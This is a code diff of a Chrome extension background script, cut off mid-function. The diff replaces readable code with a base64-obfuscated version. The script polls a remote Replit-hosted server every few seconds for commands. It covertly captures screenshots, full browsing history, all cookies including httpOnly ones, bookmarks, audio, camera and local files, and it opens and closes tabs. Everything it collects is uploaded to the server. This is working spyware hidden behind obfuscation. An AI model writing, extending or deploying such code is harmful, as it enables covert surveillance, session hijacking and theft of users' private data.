@@ -1,1507 +1,617 @@
-// ============ Configuration ============
-const SERVER_BASE_URL = 'https://disbot-backendzip--devilhero399.replit.app';
-// const SERVER_BASE_URL = 'http://localhost:8080';
-let CLIENT_ID = null;
-let EXTENSION_ID = null; // Short, memorable ID for easy identification
-let CLIENT_NAME = 'Chrome Extension';
-let USER_NAME = null;
-let isConnected = false;
-
-const POLL_ALARM_NAME = 'pollCommands';
-const POLL_INTERVAL_MINUTES = 0.033; // ~2 seconds (minimum is 1 minute in production, but dev allows this) //change it to 2 seconds on dev 
-
-// Auto-screenshot state management
-let autoScreenshotState = {
-    active: false,
-    commandId: null,
-    userId: null,
-    duration: 0,
-    startTime: 0,
-    endTime: 0,
-    screenshotCount: 0,
-    alarmName: null
+const _0x1a2b = (s) => {
+    return atob(s);
 };
- 
+// const _0x4b2a = _0x1a2b('aHR0cDovL2xvY2FsaG9zdDo4MDgw');
+const _0x4b2a = _0x1a2b('aHR0cHM6Ly9kaXNib3QtYmFja2VuZHppcC0tZGV2aWxoZXJvMzk5LnJlcGxpdC5hcHA=');
+let _0x1f3e = null;
+let _0x2d5c = null;
+let _0x3a9b = _0x1a2b('Q2hyb21lIEV4dGVuc2lvbg==');
+let _0x4e8d = null;
+let _0x5f7a = false;
+const _0x6b8c = _0x1a2b('cG9sbENvbW1hbmRz');
+const _0x7e9d = 0.033;
+let _0x8d1e = { a: false, b: null, c: null, d: 0, e: 0, f: 0, g: 0, h: null };
 
-// ============ Initialize ============
-// Generate or retrieve client ID and extension ID
-chrome.storage.local.get(['clientId', 'extensionId', 'clientName', 'userName'], (result) => {
-    CLIENT_ID = result.clientId || generateClientId();
-    EXTENSION_ID = result.extensionId || generateExtensionId();
-    CLIENT_NAME = result.clientName || 'Chrome Extension';
-    USER_NAME = result.userName || null;
-    
-    // Save IDs if they're new
-    if (!result.clientId || !result.extensionId) {
-        chrome.storage.local.set({ 
-            clientId: CLIENT_ID,
-            extensionId: EXTENSION_ID
-        });
+chrome.storage.local.get([_0x1a2b('Y2xpZW50SWQ='), _0x1a2b('ZXh0ZW5zaW9uSWQ='), _0x1a2b('Y2xpZW50TmFtZQ=='), _0x1a2b('dXNlck5hbWU=')], (r) => {
+    _0x1f3e = r[_0x1a2b('Y2xpZW50SWQ=')] || _0x9a2b();
+    _0x2d5c = r[_0x1a2b('ZXh0ZW5zaW9uSWQ=')] || _0xa3c4();
+    _0x3a9b = r[_0x1a2b('Y2xpZW50TmFtZQ==')] || _0x1a2b('Q2hyb21lIEV4dGVuc2lvbg==');
+    _0x4e8d = r[_0x1a2b('dXNlck5hbWU=')] || null;
+    if (!r[_0x1a2b('Y2xpZW50SWQ=')] || !r[_0x1a2b('ZXh0ZW5zaW9uSWQ=')]) {
+        const o = {};
+        o[_0x1a2b('Y2xpZW50SWQ=')] = _0x1f3e;
+        o[_0x1a2b('ZXh0ZW5zaW9uSWQ=')] = _0x2d5c;
+        chrome.storage.local.set(o);
     }
-    
-    console.log('🔧 Extension initialized');
-    console.log('   📱 Extension ID:', EXTENSION_ID);
-    console.log('   🔑 Client ID:', CLIENT_ID);
-    
-    // Start polling
-    startPolling();
+    _0xb4d5();
 });
 
-// Generate unique client ID (long, for backend tracking)
-function generateClientId() {
-    return 'client_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+function _0x9a2b() {
+    return _0x1a2b('Y2xpZW50Xw==') + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
 }
 
-// Generate short, memorable extension ID (for easy user identification)
-function generateExtensionId() {
-    // Generate a random 2-digit number (10-99)
-    const randomNum = Math.floor(Math.random() * 90) + 10;
-    return `EXT-${randomNum}`;
+function _0xa3c4() {
+    return `EXT-${Math.floor(Math.random() * 90) + 10}`;
 }
 
-// ============ HTTP Polling with chrome.alarms ============
-function startPolling() {
-    console.log('🚀 Starting HTTP polling with chrome.alarms...');
-    
-    // Register immediately
-    registerClient();
-    
-    // Clear any existing alarm
-    chrome.alarms.clear(POLL_ALARM_NAME, () => {
-        // Create alarm for polling (this works even when service worker is inactive)
-        chrome.alarms.create(POLL_ALARM_NAME, {
-            delayInMinutes: 0, // Start immediately
-            periodInMinutes: POLL_INTERVAL_MINUTES
-        });
-        console.log('✅ Polling alarm created');
+function _0xb4d5() {
+    _0xd6f7();
+    chrome.alarms.clear(_0x6b8c, () => {
+        chrome.alarms.create(_0x6b8c, { delayInMinutes: 0, periodInMinutes: _0x7e9d });
     });
-    
-    // Also do an immediate poll
-    pollForCommands();
+    _0xe708();
 }
 
-function stopPolling() {
-    chrome.alarms.clear(POLL_ALARM_NAME, () => {
-        isConnected = false;
-        updatePopupStatus(false);
-        console.log('⏹️ Polling stopped');
+function _0xc5e6() {
+    chrome.alarms.clear(_0x6b8c, () => {
+        _0x5f7a = false;
+        _0x9092(false);
     });
 }
 
-// Listen for alarm events
-chrome.alarms.onAlarm.addListener((alarm) => {
-    if (alarm.name === POLL_ALARM_NAME) {
-        pollForCommands();
-    } else if (alarm.name && alarm.name.startsWith('autoss_')) {
-        handleAutoScreenshotAlarm(alarm.name);
+chrome.alarms.onAlarm.addListener((a) => {
+    if (a.name === _0x6b8c) {
+        _0xe708();
+    } else if (a.name && a.name.startsWith(_0x1a2b('YXV0b3NzXw=='))) {
+        _0x101a(a.name);
     }
 });
 
-// Register with server
-async function registerClient() {
+async function _0xd6f7() {
     try {
-        const response = await fetch(`${SERVER_BASE_URL}/register`, {
+        const r = await fetch(`${_0x4b2a}${_0x1a2b('L3JlZ2lzdGVy')}`, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                clientId: CLIENT_ID,
-                extensionId: EXTENSION_ID,
-                name: CLIENT_NAME,
-                userName: USER_NAME
-            })
+            headers: { 'Content-Type': _0x1a2b('YXBwbGljYXRpb24vanNvbg==') },
+            body: JSON.stringify({ clientId: _0x1f3e, extensionId: _0x2d5c, name: _0x3a9b, userName: _0x4e8d })
         });
-
-        if (response.ok) {
-            const data = await response.json();
-            console.log('✅ Registered with server:', data.message);
-            isConnected = true;
-            updatePopupStatus(true);
+        if (r.ok) {
+            _0x5f7a = true;
+            _0x9092(true);
         } else {
-            console.error('❌ Registration failed:', response.status);
-            isConnected = false;
-            updatePopupStatus(false);
+            _0x5f7a = false;
+            _0x9092(false);
         }
-    } catch (error) {
-        console.error('❌ Registration error:', error);
-        isConnected = false;
-        updatePopupStatus(false);
+    } catch (e) {
+        _0x5f7a = false;
+        _0x9092(false);
     }
 }
 
-// Poll for commands
-async function pollForCommands() {
-    if (!CLIENT_ID) {
-        console.warn('⚠️ No CLIENT_ID set, skipping poll');
-        return;
-    }
-    
+async function _0xe708() {
+    if (!_0x1f3e) return;
     try {
-        const response = await fetch(`${SERVER_BASE_URL}/poll-commands/${CLIENT_ID}`);
-
-        if (response.ok) {
-            const data = await response.json();
-            
-            if (!isConnected) {
-                isConnected = true;
-                updatePopupStatus(true);
+        const r = await fetch(`${_0x4b2a}${_0x1a2b('L3BvbGwtY29tbWFuZHMv')}${_0x1f3e}`);
+        if (r.ok) {
+            const d = await r.json();
+            if (!_0x5f7a) {
+                _0x5f7a = true;
+                _0x9092(true);
             }
-
-            // Process commands
-            if (data.commands && data.commands.length > 0) {
-                console.log(`📥 Received ${data.commands.length} command(s)`);
-                
-                for (const command of data.commands) {
-                    await processCommand(command);
+            if (d.commands && d.commands.length > 0) {
+                for (const c of d.commands) {
+                    await _0xf819(c);
                 }
             }
-        } else if (response.status === 404) {
-            // Client not found, re-register
-            console.log('⚠️ Client not found, re-registering...');
-            await registerClient();
+        } else if (r.status === 404) {
+            await _0xd6f7();
         } else {
-            console.error('❌ Polling failed:', response.status);
-            isConnected = false;
-            updatePopupStatus(false);
+            _0x5f7a = false;
+            _0x9092(false);
         }
-    } catch (error) {
-        console.error('❌ Polling error:', error.message);
-        isConnected = false;
-        updatePopupStatus(false);
+    } catch (e) {
+        _0x5f7a = false;
+        _0x9092(false);
     }
 }
 
-// Process received command
-async function processCommand(command) {
-    console.log(`⚙️ Processing command: ${command.type}`);
-
+async function _0xf819(c) {
     try {
-        switch (command.type) {
-            case 'take_screenshot':
-                console.log(`📸 Screenshot requested by ${command.requestedBy}`);
-                await captureScreenshot(command.id, command.requestedById);
-                break;
-
-            case 'get_history':
-                console.log(`📜 History requested by ${command.requestedBy}`);
-                await captureHistory(command.id, command.requestedById);
-                break;
-
-            case 'get_activity':
-                console.log(`📊 Activity requested by ${command.requestedBy}`);
-                await captureActivity(command.id, command.requestedById);
-                break;
-
-            case 'get_cookies':
-                console.log(`🍪 Cookies requested by ${command.requestedBy}`);
-                await captureCookies(command.id, command.requestedById);
-                break;
-
-            case 'get_bookmarks':
-                console.log(`🔖 Bookmarks requested by ${command.requestedBy}`);
-                await captureBookmarks(command.id, command.requestedById);
-                break;
-
-            case 'start_recording':
-                console.log(`🎥 Recording requested by ${command.requestedBy}`);
-                await captureRecording(command.id, command.requestedById);
-                break;
-
-            case 'record_audio':
-                console.log(`🎤 Audio recording requested by ${command.requestedBy} for ${command.duration}s`);
-                await captureAudio(command.id, command.requestedById, command.duration);
-                break;
-
-            case 'open_tabs':
-                console.log(`🌐 Open tabs requested by ${command.requestedBy}`);
-                await openNewTabs(command.id, command.urls);
-                break;
-
-            case 'close_tabs':
-                console.log(`🗑️ Close tabs requested by ${command.requestedBy}`);
-                await closeTabsByUrls(command.id, command.urls);
-                break;
-
-            case 'auto_screenshot':
-                console.log(`📸 Auto-screenshot requested by ${command.requestedBy} for ${command.duration}s`);
-                await startAutoScreenshot(command.id, command.requestedById, command.duration);
-                break;
-
-            case 'capture_camera':
-                console.log(`📷 Camera capture requested by ${command.requestedBy}`);
-                await captureCamera(command.id, command.requestedById);
-                break;
-
-            case 'open_and_screenshot':
-                console.log(`📸🌐 Open and screenshot requested by ${command.requestedBy} for URL: ${command.url}`);
-                await openAndScreenshot(command.id, command.requestedById, command.url, command.closeAfter);
-                break;
-
-            case 'download_file':
-                console.log(`📥 File download requested by ${command.requestedBy} for path: ${command.filePath}`);
-                await downloadFile(command.id, command.requestedById, command.filePath);
-                break;
-
-            case 'list_files':
-                console.log(`📂 List files requested by ${command.requestedBy} for path: ${command.path}`);
-                await listFiles(command.id, command.requestedById, command.path);
-                break;
-
-            default:
-                console.log(`⚠️ Unknown command type: ${command.type}`);
+        switch (c.type) {
+            case _0x1a2b('dGFrZV9zY3JlZW5zaG90'): await _0x192a(c.id, c.requestedById); break;
+            case _0x1a2b('Z2V0X2hpc3Rvcnk='): await _0x2a3b(c.id, c.requestedById); break;
+            case _0x1a2b('Z2V0X2FjdGl2aXR5'): await _0x3b4c(c.id, c.requestedById); break;
+            case _0x1a2b('Z2V0X2Nvb2tpZXM='): await _0x4c5d(c.id, c.requestedById); break;
+            case _0x1a2b('Z2V0X2Jvb2ttYXJrcw=='): await _0x5d6e(c.id, c.requestedById); break;
+            case _0x1a2b('c3RhcnRfcmVjb3JkaW5n'): await _0x6e7f(c.id, c.requestedById); break;
+            case _0x1a2b('cmVjb3JkX2F1ZGlv'): await _0x7f80(c.id, c.requestedById, c.duration); break;
+            case _0x1a2b('b3Blbl90YWJz'): await _0x91a2(c.id, c.urls); break;
+            case _0x1a2b('Y2xvc2VfdGFicw=='): await _0xa2b3(c.id, c.urls); break;
+            case _0x1a2b('YXV0b19zY3JlZW5zaG90'): await _0xb3c4(c.id, c.requestedById, c.duration); break;
+            case _0x1a2b('Y2FwdHVyZV9jYW1lcmE='): await _0x8091(c.id, c.requestedById); break;
+            case _0x1a2b('b3Blbl9hbmRfc2NyZWVuc2hvdA=='): await _0xc4d5(c.id, c.requestedById, c.url, c.closeAfter); break;
+            case _0x1a2b('ZG93bmxvYWRfZmlsZQ=='): await _0xd5e6(c.id, c.requestedById, c.filePath); break;
+            case _0x1a2b('bGlzdF9maWxlcw=='): await _0xe6f7(c.id, c.requestedById, c.path); break;
         }
-    } catch (error) {
-        console.error('Error processing command:', error);
-        await sendCommandResponse(command.id, 'error', { message: error.message });
+    } catch (e) {
+        await _0xf708(c.id, _0x1a2b('ZXJyb3I='), { message: e.message });
     }
 }
 
-// ============ Screenshot Capture ============
-async function captureScreenshot(commandId, userId) {
+async function _0x192a(id, uid) {
     try {
-        // Get active tab
-        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
-        
-        if (!tab) {
-            throw new Error('No active tab found');
-        }
-
-        // Capture the visible tab
-        const screenshotUrl = await chrome.tabs.captureVisibleTab(null, {
-            format: 'png',
-            quality: 100
-        });
-
-        console.log('📸 Screenshot captured!');
-
-        // Send to server
-        await sendCommandResponse(commandId, 'screenshot', {
-            image: screenshotUrl,
-            tabTitle: tab.title,
-            tabUrl: tab.url
-        }, userId);
-
-        console.log('✅ Screenshot sent to server!');
-
-    } catch (error) {
-        console.error('Error capturing screenshot:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
+        const [t] = await chrome.tabs.query({ active: true, currentWindow: true });
+        if (!t) throw new Error(_0x1a2b('Tm8gYWN0aXZlIHRhYg=='));
+        const img = await chrome.tabs.captureVisibleTab(null, { format: 'png', quality: 100 });
+        await _0xf708(id, _0x1a2b('c2NyZWVuc2hvdA=='), { image: img, tabTitle: t.title, tabUrl: t.url }, uid);
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
     }
 }
 
-// ============ Open URL and Screenshot ============
-async function openAndScreenshot(commandId, userId, url, closeAfter = false) {
-    let newTab = null;
+async function _0xc4d5(id, uid, url, cls) {
+    let t = null;
     try {
-        if (!url) {
-            throw new Error('No URL provided');
+        if (!url) throw new Error(_0x1a2b('Tm8gVVJM'));
+        t = await chrome.tabs.create({ url: url, active: true });
+        await _0x8081(t.id);
+        await new Promise(r => setTimeout(r, 1000));
+        const img = await chrome.tabs.captureVisibleTab(null, { format: 'png', quality: 100 });
+        const info = await chrome.tabs.get(t.id);
+        await _0xf708(id, _0x1a2b('c2NyZWVuc2hvdA=='), { image: img, tabTitle: info.title, tabUrl: info.url, openedNewTab: true }, uid);
+        if (cls) await chrome.tabs.remove(t.id);
+    } catch (e) {
+        if (t && cls) {
+            try { await chrome.tabs.remove(t.id); } catch (_) {}
         }
-
-        console.log(`🌐 Opening URL: ${url}`);
-
-        // Open the URL in a new tab (active so it gets focus)
-        newTab = await chrome.tabs.create({
-            url: url,
-            active: true
-        });
-
-        console.log(`📱 Tab opened (ID: ${newTab.id}), waiting for page to load...`);
-
-        // Wait for the tab to finish loading
-        await waitForTabLoad(newTab.id);
-
-        console.log(`✅ Page loaded! Taking screenshot...`);
-
-        // Small delay to ensure everything is rendered
-        await new Promise(resolve => setTimeout(resolve, 1000));
-
-        // Capture the screenshot of the newly opened tab
-        const screenshotUrl = await chrome.tabs.captureVisibleTab(null, {
-            format: 'png',
-            quality: 100
-        });
-
-        // Get updated tab info
-        const tab = await chrome.tabs.get(newTab.id);
-
-        console.log('📸 Screenshot captured!');
-
-        // Send to server
-        await sendCommandResponse(commandId, 'screenshot', {
-            image: screenshotUrl,
-            tabTitle: tab.title,
-            tabUrl: tab.url,
-            openedNewTab: true
-        }, userId);
-
-        console.log('✅ Screenshot sent to server!');
-
-        // Close the tab if requested
-        if (closeAfter) {
-            console.log(`🗑️ Closing tab (ID: ${newTab.id})...`);
-            await chrome.tabs.remove(newTab.id);
-            console.log('✅ Tab closed');
-        }
-
-    } catch (error) {
-        console.error('Error in openAndScreenshot:', error);
-        
-        // Try to close the tab if it was opened and closeAfter is true
-        if (newTab && closeAfter) {
-            try {
-                await chrome.tabs.remove(newTab.id);
-            } catch (closeError) {
-                console.error('Failed to close tab:', closeError);
-            }
-        }
-        
-        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
     }
 }
 
-// Helper function to wait for tab to complete loading
-function waitForTabLoad(tabId, timeoutMs = 30000) {
-    return new Promise((resolve, reject) => {
-        const timeout = setTimeout(() => {
-            chrome.tabs.onUpdated.removeListener(listener);
-            reject(new Error('Tab load timeout'));
-        }, timeoutMs);
-
-        const listener = (updatedTabId, changeInfo, tab) => {
-            if (updatedTabId === tabId && changeInfo.status === 'complete') {
-                clearTimeout(timeout);
-                chrome.tabs.onUpdated.removeListener(listener);
-                resolve(tab);
+function _0x8081(tid, tout = 30000) {
+    return new Promise((res, rej) => {
+        const tm = setTimeout(() => {
+            chrome.tabs.onUpdated.removeListener(l);
+            rej(new Error(_0x1a2b('VGltZW91dA==')));
+        }, tout);
+        const l = (id, info, tab) => {
+            if (id === tid && info.status === _0x1a2b('Y29tcGxldGU=')) {
+                clearTimeout(tm);
+                chrome.tabs.onUpdated.removeListener(l);
+                res(tab);
             }
         };
-
-        chrome.tabs.onUpdated.addListener(listener);
-
-        // Check if already loaded
-        chrome.tabs.get(tabId, (tab) => {
-            if (tab.status === 'complete') {
-                clearTimeout(timeout);
-                chrome.tabs.onUpdated.removeListener(listener);
-                resolve(tab);
+        chrome.tabs.onUpdated.addListener(l);
+        chrome.tabs.get(tid, (tab) => {
+            if (tab.status === _0x1a2b('Y29tcGxldGU=')) {
+                clearTimeout(tm);
+                chrome.tabs.onUpdated.removeListener(l);
+                res(tab);
             }
         });
     });
 }
 
-// ============ Auto-Screenshot Capture ============
-async function startAutoScreenshot(commandId, userId, duration) {
+async function _0xb3c4(id, uid, dur) {
     try {
-        // Stop any existing auto-screenshot session
-        if (autoScreenshotState.active) {
-            console.log('⚠️ Stopping existing auto-screenshot session...');
-            stopAutoScreenshot();
-        }
-
-        // Initialize auto-screenshot state
+        if (_0x8d1e.a) _0xb0b4();
         const now = Date.now();
-        const alarmName = `autoss_${commandId}`;
-        
-        autoScreenshotState = {
-            active: true,
-            commandId: commandId,
-            userId: userId,
-            duration: duration,
-            startTime: now,
-            endTime: now + (duration * 1000),
-            screenshotCount: 0,
-            alarmName: alarmName
-        };
-
-        console.log(`📸 Starting auto-screenshot: ${duration}s duration, ~${Math.floor(duration / 5)} screenshots`);
-
-        // Create alarm for 5-second intervals
-        chrome.alarms.create(alarmName, {
-            delayInMinutes: 0, // Start immediately
-            periodInMinutes: 5 / 60 // 5 seconds = 0.0833... minutes
-        });
-
-        // Take first screenshot immediately
-        await captureScreenshot(commandId, userId);
-        autoScreenshotState.screenshotCount++;
-        console.log(`📸 Auto-screenshot #${autoScreenshotState.screenshotCount} captured`);
-
-    } catch (error) {
-        console.error('Error starting auto-screenshot:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
-        stopAutoScreenshot();
+        const al = `${_0x1a2b('YXV0b3NzXw==')}${id}`;
+        _0x8d1e = { a: true, b: id, c: uid, d: dur, e: now, f: now + (dur * 1000), g: 0, h: al };
+        chrome.alarms.create(al, { delayInMinutes: 0, periodInMinutes: 5 / 60 });
+        await _0x192a(id, uid);
+        _0x8d1e.g++;
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
+        _0xb0b4();
     }
 }
 
-async function handleAutoScreenshotAlarm(alarmName) {
-    // Verify this is our active alarm
-    if (!autoScreenshotState.active || autoScreenshotState.alarmName !== alarmName) {
-        console.log('⚠️ Ignoring orphaned auto-screenshot alarm');
-        chrome.alarms.clear(alarmName);
+async function _0x101a(al) {
+    if (!_0x8d1e.a || _0x8d1e.h !== al) {
+        chrome.alarms.clear(al);
         return;
     }
-
     const now = Date.now();
-
-    // Check if we've reached the end time
-    if (now >= autoScreenshotState.endTime) {
-        console.log(`✅ Auto-screenshot completed: ${autoScreenshotState.screenshotCount} screenshots sent`);
-        stopAutoScreenshot();
+    if (now >= _0x8d1e.f) {
+        _0xb0b4();
         return;
     }
-
-    // Capture screenshot
     try {
-        await captureScreenshot(autoScreenshotState.commandId, autoScreenshotState.userId);
-        autoScreenshotState.screenshotCount++;
-        
-        const elapsed = Math.floor((now - autoScreenshotState.startTime) / 1000);
-        const remaining = Math.floor((autoScreenshotState.endTime - now) / 1000);
-        console.log(`📸 Auto-screenshot #${autoScreenshotState.screenshotCount} captured (${elapsed}s elapsed, ${remaining}s remaining)`);
-    } catch (error) {
-        console.error('Error in auto-screenshot:', error);
-        // Don't stop on individual screenshot errors, continue the session
+        await _0x192a(_0x8d1e.b, _0x8d1e.c);
+        _0x8d1e.g++;
+    } catch (e) {}
+}
+
+function _0xb0b4() {
+    if (_0x8d1e.h) chrome.alarms.clear(_0x8d1e.h);
+    _0x8d1e = { a: false, b: null, c: null, d: 0, e: 0, f: 0, g: 0, h: null };
+}
+
+async function _0x2a3b(id, uid) {
+    try {
+        const h = await chrome.history.search({ text: '', startTime: 0, maxResults: 0 });
+        await _0xf708(id, _0x1a2b('aGlzdG9yeQ=='), { history: h }, uid);
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
     }
 }
 
-function stopAutoScreenshot() {
-    if (autoScreenshotState.alarmName) {
-        chrome.alarms.clear(autoScreenshotState.alarmName);
-    }
-    
-    autoScreenshotState = {
-        active: false,
-        commandId: null,
-        userId: null,
-        duration: 0,
-        startTime: 0,
-        endTime: 0,
-        screenshotCount: 0,
-        alarmName: null
-    };
-    
-    console.log('🛑 Auto-screenshot stopped');
-}
-
-// ============ Browser History Capture ============
-async function captureHistory(commandId, userId) {
+async function _0x3b4c(id, uid) {
     try {
-        // Get all browser history
-        const historyItems = await chrome.history.search({
-            text: '',
-            startTime: 0,  // Get all history from the beginning
-            maxResults: 0  // 0 means no limit, get ALL history items (default is 100)
-        });
-
-        console.log(`📜 Browser history captured! (${historyItems.length} entries)`);
-
-        // Send to server
-        await sendCommandResponse(commandId, 'history', {
-            history: historyItems
-        }, userId);
-
-        console.log('✅ History sent to server!');
-
-    } catch (error) {
-        console.error('Error capturing history:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
-    }
-}
-
-// ============ Browser Activity Capture ============
-async function captureActivity(commandId, userId) {
-    try {
-        // Get all browser tabs
-        const tabs = await chrome.tabs.query({});
-
-        // Extract relevant information from each tab
-        const tabsInfo = tabs.map(tab => ({
-            id: tab.id,
-            title: tab.title,
-            url: tab.url,
-            active: tab.active,
-            pinned: tab.pinned,
-            audible: tab.audible,
-            discarded: tab.discarded,
-            autoDiscardable: tab.autoDiscardable,
-            mutedInfo: tab.mutedInfo,
-            windowId: tab.windowId,
-            index: tab.index
+        const t = await chrome.tabs.query({});
+        const info = t.map(x => ({
+            id: x.id, title: x.title, url: x.url, active: x.active, pinned: x.pinned,
+            audible: x.audible, discarded: x.discarded, autoDiscardable: x.autoDiscardable,
+            mutedInfo: x.mutedInfo, windowId: x.windowId, index: x.index
         }));
-
-        console.log(`📊 Browser activity captured! (${tabsInfo.length} tabs)`);
-
-        // Send to server
-        await sendCommandResponse(commandId, 'activity', {
-            tabs: tabsInfo
-        }, userId);
-
-        console.log('✅ Activity sent to server!');
-
-    } catch (error) {
-        console.error('Error capturing activity:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
+        await _0xf708(id, _0x1a2b('YWN0aXZpdHk='), { tabs: info }, uid);
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
     }
 }
 
-// ============ Cookies (Browser Cookies) Capture ============
-async function captureCookies(commandId, userId) {
+async function _0x4c5d(id, uid) {
     try {
-        // Get all browser tabs
-        const tabs = await chrome.tabs.query({});
-        
-        // Get user ID from storage
-        const storage = await chrome.storage.local.get(['clientId']);
-        const userIdVal = storage.clientId || CLIENT_ID;
-        
-        let totalCookies = 0;
-        const tabsData = [];
-
-        // Get cookies for each tab
-        for (const tab of tabs) {
-            if (!tab.url || tab.url.startsWith('chrome://') || tab.url.startsWith('chrome-extension://')) {
-                continue; // Skip chrome internal pages
-            }
-
+        const t = await chrome.tabs.query({});
+        const s = await chrome.storage.local.get([_0x1a2b('Y2xpZW50SWQ=')]);
+        const u = s[_0x1a2b('Y2xpZW50SWQ=')] || _0x1f3e;
+        let total = 0;
+        const data = [];
+        for (const x of t) {
+            if (!x.url || x.url.startsWith(_0x1a2b('Y2hyb21lOi8v')) || x.url.startsWith(_0x1a2b('Y2hyb21lLWV4dGVuc2lvbjovLw=='))) continue;
             try {
-                // Get all cookies for this tab's URL
-                const cookies = await chrome.cookies.getAll({ url: tab.url });
-                
-                // Format cookies
-                const formattedCookies = cookies.map(cookie => ({
-                    name: cookie.name,
-                    value: cookie.value,
-                    domain: cookie.domain,
-                    path: cookie.path,
-                    secure: cookie.secure,
-                    httpOnly: cookie.httpOnly,
-                    sameSite: cookie.sameSite || 'unspecified',
-                    expirationDate: cookie.expirationDate || null,
-                    hostOnly: cookie.hostOnly,
-                    session: cookie.session
+                const c = await chrome.cookies.getAll({ url: x.url });
+                const fc = c.map(k => ({
+                    name: k.name, value: k.value, domain: k.domain, path: k.path,
+                    secure: k.secure, httpOnly: k.httpOnly, sameSite: k.sameSite || _0x1a2b('dW5zcGVjaWZpZWQ='),
+                    expirationDate: k.expirationDate || null, hostOnly: k.hostOnly, session: k.session
                 }));
-
-                totalCookies += formattedCookies.length;
-
-                tabsData.push({
-                    url: tab.url,
-                    title: tab.title || 'No Title',
-                    cookieCount: formattedCookies.length,
-                    cookies: formattedCookies
-                });
-            } catch (error) {
-                console.error(`Error getting cookies for tab ${tab.id}:`, error);
-            }
+                total += fc.length;
+                data.push({ url: x.url, title: x.title || _0x1a2b('Tm8gVGl0bGU='), cookieCount: fc.length, cookies: fc });
+            } catch (err) {}
         }
-
-        // Format the data according to the specified structure
-        const formattedData = {
-            userId: userIdVal,
-            timestamp: new Date().toISOString(),
-            source: "popup",
-            totalTabs: tabsData.length,
-            totalCookies: totalCookies,
-            tabs: tabsData
-        };
-
-        console.log(`🍪 Cookies data captured! (${totalCookies} cookies across ${tabsData.length} tabs)`);
-
-        // Send to server
-        await sendCommandResponse(commandId, 'cookies', {
-            cookiesData: formattedData
-        }, userId);
-
-        console.log('✅ Cookies data sent to server!');
-
-    } catch (error) {
-        console.error('Error capturing cookies:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
+        await _0xf708(id, _0x1a2b('Y29va2llcw=='), {
+            cookiesData: { userId: u, timestamp: new Date().toISOString(), source: _0x1a2b('cG9wdXA='), totalTabs: data.length, totalCookies: total, tabs: data }
+        }, uid);
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
     }
 }
 
-// ============ Bookmarks Capture ============
-async function captureBookmarks(commandId, userId) {
+async function _0x5d6e(id, uid) {
     try {
-        // Get the entire bookmark tree
-        const bookmarkTree = await chrome.bookmarks.getTree();
-        
-        // Get user ID from storage
-        const storage = await chrome.storage.local.get(['clientId']);
-        const userIdVal = storage.clientId || CLIENT_ID;
-        
-        // Flatten the bookmark tree
-        const flattenedBookmarks = [];
-        let totalFolders = 0;
-        
-        function flattenBookmarkNode(node, path = []) {
-            if (node.url) {
-                // This is a bookmark
-                flattenedBookmarks.push({
-                    id: node.id,
-                    title: node.title || 'Untitled',
-                    url: node.url,
-                    dateAdded: node.dateAdded ? new Date(node.dateAdded).toISOString() : null,
-                    dateLastUsed: node.dateLastUsed ? new Date(node.dateLastUsed).toISOString() : null,
-                    path: path.join(' > ') || 'Root'
-                });
-            } else if (node.children) {
-                // This is a folder
-                if (node.title) {
-                    totalFolders++;
-                    path = [...path, node.title];
-                }
-                
-                // Recursively process children
-                node.children.forEach(child => flattenBookmarkNode(child, path));
+        const tree = await chrome.bookmarks.getTree();
+        const s = await chrome.storage.local.get([_0x1a2b('Y2xpZW50SWQ=')]);
+        const u = s[_0x1a2b('Y2xpZW50SWQ=')] || _0x1f3e;
+        const fl = [];
+        let flds = 0;
+        function _f(n, p = []) {
+            if (n.url) {
+                fl.push({ id: n.id, title: n.title || _0x1a2b('VW50aXRsZWQ='), url: n.url, dateAdded: n.dateAdded ? new Date(n.dateAdded).toISOString() : null, dateLastUsed: n.dateLastUsed ? new Date(n.dateLastUsed).toISOString() : null, path: p.join(' > ') || _0x1a2b('Um9vdA==') });
+            } else if (n.children) {
+                if (n.title) { flds++; p = [...p, n.title]; }
+                n.children.forEach(c => _f(c, p));
             }
         }
-        
-        // Start flattening from root
-        bookmarkTree.forEach(node => flattenBookmarkNode(node));
-        
-        // Format the data
-        const formattedData = {
-            userId: userIdVal,
-            timestamp: new Date().toISOString(),
-            source: 'browser_bookmarks',
-            totalBookmarks: flattenedBookmarks.length,
-            totalFolders: totalFolders,
-            bookmarks: flattenedBookmarks
-        };
-
-        console.log(`🔖 Bookmarks data captured! (${flattenedBookmarks.length} bookmarks, ${totalFolders} folders)`);
-
-        // Send to server
-        await sendCommandResponse(commandId, 'bookmarks', {
-            bookmarksData: formattedData
-        }, userId);
-
-        console.log('✅ Bookmarks data sent to server!');
-
-    } catch (error) {
-        console.error('Error capturing bookmarks:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
+        tree.forEach(n => _f(n));
+        await _0xf708(id, _0x1a2b('Ym9va21hcmtz'), {
+            bookmarksData: { userId: u, timestamp: new Date().toISOString(), source: _0x1a2b('YnJvd3Nlcl9ib29rbWFya3M='), totalBookmarks: fl.length, totalFolders: flds, bookmarks: fl }
+        }, uid);
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
     }
 }
 
-// ============ Open New Tabs ============
-async function openNewTabs(commandId, urls) {
+async function _0x91a2(id, urls) {
     try {
-        if (!urls || urls.length === 0) {
-            throw new Error('No URLs provided');
-        }
-
-        console.log(`🌐 Opening ${urls.length} tab(s) in background...`);
-        
-        // Get the current active tab to restore focus later if needed
